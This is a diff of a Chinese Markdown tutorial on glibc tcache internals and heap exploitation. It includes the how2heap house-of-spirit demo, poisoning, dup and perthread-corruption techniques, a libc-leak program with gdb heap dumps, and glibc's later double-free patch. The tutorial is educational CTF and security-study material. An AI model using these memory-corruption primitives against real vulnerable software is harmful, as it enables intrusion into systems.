@@ -1,5 +1,67 @@
 ## tcache makes heap exploitation easy again
+
+### 0x01 Tcache overview
+
+在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_pertheread_struct
+
+```C
+/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+
+/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread tcache_perthread_struct *tcache = NULL;
+```
+
+
+
+其中有两个重要的函数， `tcache_get()` 和 `tcache_put()`:
+
+```C
+static void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx < TCACHE_MAX_BINS);
+  e->next = tcache->entries[tc_idx];
+  tcache->entries[tc_idx] = e;
+  ++(tcache->counts[tc_idx]);
+}
+
+static void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  assert (tc_idx < TCACHE_MAX_BINS);
+  assert (tcache->entries[tc_idx] > 0);
+  tcache->entries[tc_idx] = e->next;
+  --(tcache->counts[tc_idx]);
+  return (void *) e;
+}
+
+```
+
+这两个函数的会在函数 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) 和 [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) 的开头被调用，其中 `tcache_put` 当所请求的分配大小不大于`0x408`并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数`mp_.tcache_count`是`7`。
+
+```c
+/* This is another arbitrary limit, which tunables can change.  Each
+   tcache bin will hold at most this number of chunks.  */
+# define TCACHE_FILL_COUNT 7
+#endif
+```
+
+
+
 再复习一遍 `tcache_get()` 的源码
+
 ```C
 static __always_inline void *
 tcache_get (size_t tc_idx)
@@ -12,9 +74,170 @@ tcache_get (size_t tc_idx)
   return (void *) e;
 }
 ```
-可以发现 `tcache_get()` 获取 chunk 的安全检查非常少（对 `tc_idx` 的检测可以忽略），可以说几乎没有任何检查，因此各种利用方式在有 tcache 时利用步骤也大大简化了。
+在 `tcache_get` 中，仅仅检查了 **tc_idx** ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 ` tcache->entries[tc_idx] = e->next;`
 
-### tcache poisoning
+### 0x02 Tcache Usage
+
+
+
+- 内存存放：
+
+  可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。
+  
+
+  ```c
+  
+  _int_free (mstate av, mchunkptr p, int have_lock)
+  {
+    INTERNAL_SIZE_T size;        /* its size */
+    mfastbinptr *fb;             /* associated fastbin */
+    mchunkptr nextchunk;         /* next contiguous chunk */
+    INTERNAL_SIZE_T nextsize;    /* its size */
+    int nextinuse;               /* true if nextchunk is used */
+    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
+    mchunkptr bck;               /* misc temp for linking */
+    mchunkptr fwd;               /* misc temp for linking */
+  
+    size = chunksize (p);
+  
+    /* Little security check which won't hurt performance: the
+       allocator never wrapps around at the end of the address space.
+       Therefore we can exclude some size values which might appear
+       here by accident or by "design" from some intruder.  */
+    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
+        || __builtin_expect (misaligned_chunk (p), 0))
+      malloc_printerr ("free(): invalid pointer");
+    /* We know that each chunk is at least MINSIZE bytes in size or a
+       multiple of MALLOC_ALIGNMENT.  */
+    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
+      malloc_printerr ("free(): invalid size");
+  
+    check_inuse_chunk(av, p);
+  
+  #if USE_TCACHE
+    {
+      size_t tc_idx = csize2tidx (size);
+  
+      if (tcache
+  	&& tc_idx < mp_.tcache_bins
+  	&& tcache->counts[tc_idx] < mp_.tcache_count)
+        {
+  	tcache_put (p, tc_idx);
+  	return;
+        }
+    }
+  #endif
+  
+  ......
+  }
+  ```
+
+
+
+-  内存申请：
+
+在内存分配的malloc函数中有多处，会将内存块移入tcache中。
+
+（1）首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。
+
+（2）其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。
+
+（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。
+
+代码太长就不全贴了，贴个符合fastbin 的时候
+
+```c
+  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
+    {
+      idx = fastbin_index (nb);
+      mfastbinptr *fb = &fastbin (av, idx);
+      mchunkptr pp;
+      victim = *fb;
+
+      if (victim != NULL)
+	{
+	  if (SINGLE_THREAD_P)
+	    *fb = victim->fd;
+	  else
+	    REMOVE_FB (fb, pp, victim);
+	  if (__glibc_likely (victim != NULL))
+	    {
+	      size_t victim_idx = fastbin_index (chunksize (victim));
+	      if (__builtin_expect (victim_idx != idx, 0))
+		malloc_printerr ("malloc(): memory corruption (fast)");
+	      check_remalloced_chunk (av, victim, nb);
+#if USE_TCACHE
+	      /* While we're here, if we see other chunks of the same size,
+		 stash them in the tcache.  */
+	      size_t tc_idx = csize2tidx (nb);
+	      if (tcache && tc_idx < mp_.tcache_bins)
+		{
+		  mchunkptr tc_victim;
+
+		  /* While bin not empty and tcache not full, copy chunks.  */
+		  while (tcache->counts[tc_idx] < mp_.tcache_count
+			 && (tc_victim = *fb) != NULL)
+		    {
+		      if (SINGLE_THREAD_P)
+			*fb = tc_victim->fd;
+		      else
+			{
+			  REMOVE_FB (fb, pp, tc_victim);
+			  if (__glibc_unlikely (tc_victim == NULL))
+			    break;
+			}
+		      tcache_put (tc_victim, tc_idx);
+		    }
+		}
+#endif
+	      void *p = chunk2mem (victim);
+	      alloc_perturb (p, bytes);
+	      return p;
+	    }
+	}
+    }
+```
+
+
+
+ 
+
+- tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。
+
+- 在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。
+
+  ```c
+  #if USE_TCACHE
+        /* If we've processed as many chunks as we're allowed while
+  	 filling the cache, return one of the cached ones.  */
+        ++tcache_unsorted_count;
+        if (return_cached
+  	  && mp_.tcache_unsorted_limit > 0
+  	  && tcache_unsorted_count > mp_.tcache_unsorted_limit)
+  	{
+  	  return tcache_get (tc_idx);
+  	}
+  #endif
+  ```
+
+- 在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。
+
+  ```c
+  #if USE_TCACHE
+        /* If all the small chunks we found ended up cached, return one now.  */
+        if (return_cached)
+  	{
+  	  return tcache_get (tc_idx);
+  	}
+  #endif
+  ```
+
+
+
+### 0x03 Pwn Tcache
+
+#### tcache poisoning
+
 通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。
 
 以 how2heap 中的 [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c) 为例
@@ -493,7 +716,7 @@ rax            0x7fffffffdfa8	140737488347048
 ```
 可以看出 `tache posioning` 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。
 
-### tcache dup
+#### tcache dup
 类似 `fastbin dup`，不过利用的是 `tcache_put()` 的不严谨
 ```C
 static __always_inline void
@@ -695,7 +918,7 @@ pwndbg> heapinfo
 ```
 可以看出，这种方法与 `fastbin dup` 相比也简单了很多。
 
-### tcache perthread corruption
+#### tcache perthread corruption
 我们已经知道 `tcache_perthread_struct` 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。
 
 这里没找到太好的例子，自己想了一种情况
@@ -733,4 +956,232 @@ tcache_    +------------+<---------------------------+
 这样，两次 malloc 后我们就返回了 `tcache_prethread_struct` 的地址，就可以控制整个 tcache 了。
 
 **因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。**
+
+
+
+#### tcache house of spirit
+
+拿 how2heap 的源码来讲：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
+	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
+	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
+	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");
+
+	fprintf(stderr, "Ok. Let's start with the example!.\n\n");
+
+
+	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
+	malloc(1);
+
+	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
+	unsigned long long *a; //pointer that will be overwritten
+	unsigned long long fake_chunks[10]; //fake chunk region
+
+	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);
+
+	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
+	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
+	fake_chunks[1] = 0x40; // this is the size
+
+
+	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
+	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+
+	a = &fake_chunks[2];
+
+	fprintf(stderr, "Freeing the overwritten pointer.\n");
+	free(a);
+
+	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
+	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
+}
+```
+
+
+
+攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的chunk，然后去 free 掉他，我们会发现
+
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x4052e0 (size : 0x20d20)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x90)   tcache_entry[7]: 0x7fffffffe510 --> 0x401340
+```
+
+
+
+Tache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。
+
+#### smallbin unlink
+
+在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。
+
+
+
+####  libc leak
+
+在以前的libc 版本中，我们只需这样：
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+
+int main()
+{
+	long *a = malloc(0x1000);
+	malloc(0x10);
+	free(a);
+	printf("%p\n",a[0]);
+} 
+```
+
+
+
+但是在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc , char* argv[])
+{
+	long* t[7];
+	long *a=malloc(0x100);
+	long *b=malloc(0x10);
+	
+	// make tcache bin full
+	for(int i=0;i<7;i++)
+		t[i]=malloc(0x100);
+	for(int i=0;i<7;i++)
+		free(t[i]);
+	
+	free(a);
+	// a is put in an unsorted bin because the tcache bin of this size is full
+	printf("%p\n",a[0]);
+} 
+```
+
+之后，我们就可以 leak libc 了。
+
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x555555559af0 (size : 0x20510)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x555555559250 (size : 0x110)
+(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
+gdb-peda$ parseheap
+addr                prev                size                 status              fd                bk
+0x555555559000      0x0                 0x250                Used                None              None
+0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
+0x555555559360      0x110               0x20                 Used                None              None
+0x555555559380      0x0                 0x110                Used                None              None
+0x555555559490      0x0                 0x110                Used                None              None
+0x5555555595a0      0x0                 0x110                Used                None              None
+0x5555555596b0      0x0                 0x110                Used                None              None
+```
+
+
+
+### 0x04 Tcache Check
+
+在最新的 libc 的[commit](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7) 中更新了 Tcache 的 double free 的check：
+
+```c
+index 6d7a6a8..f730d7a 100644 (file)
+--- a/malloc/malloc.c
++++ b/malloc/malloc.c
+@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
+ typedef struct tcache_entry
+ {
+   struct tcache_entry *next;
++  /* This field exists to detect double frees.  */
++  struct tcache_perthread_struct *key;
+ } tcache_entry;
+ 
+ /* There is one of these for each thread, which contains the
+@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
+ {
+   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+   assert (tc_idx < TCACHE_MAX_BINS);
++
++  /* Mark this chunk as "in the tcache" so the test in _int_free will
++     detect a double free.  */
++  e->key = tcache;
++
+   e->next = tcache->entries[tc_idx];
+   tcache->entries[tc_idx] = e;
+   ++(tcache->counts[tc_idx]);
+@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
+   assert (tcache->entries[tc_idx] > 0);
+   tcache->entries[tc_idx] = e->next;
+   --(tcache->counts[tc_idx]);
++  e->key = NULL;
+   return (void *) e;
+ }
+ 
+@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
+   {
+     size_t tc_idx = csize2tidx (size);
+ 
++    /* Check to see if it's already in the tcache.  */
++    tcache_entry *e = (tcache_entry *) chunk2mem (p);
++
++    /* This test succeeds on double free.  However, we don't 100%
++       trust it (it also matches random payload data at a 1 in
++       2^<size_t> chance), so verify it's not an unlikely coincidence
++       before aborting.  */
++    if (__glibc_unlikely (e->key == tcache && tcache))
++      {
++       tcache_entry *tmp;
++       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
++       for (tmp = tcache->entries[tc_idx];
++            tmp;
++            tmp = tmp->next)
++         if (tmp == e)
++           malloc_printerr ("free(): double free detected in tcache 2");
++       /* If we get here, it was a coincidence.  We've wasted a few
++          cycles, but don't abort.  */
++      }
++
+     if (tcache
+        && tc_idx < mp_.tcache_bins
+        && tcache->counts[tc_idx] < mp_.tcache_count)
+```
+
+
+
+目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。
+
+### 0x05 建议习题：
+
+* 2018 HITCON children_tcache
+
 
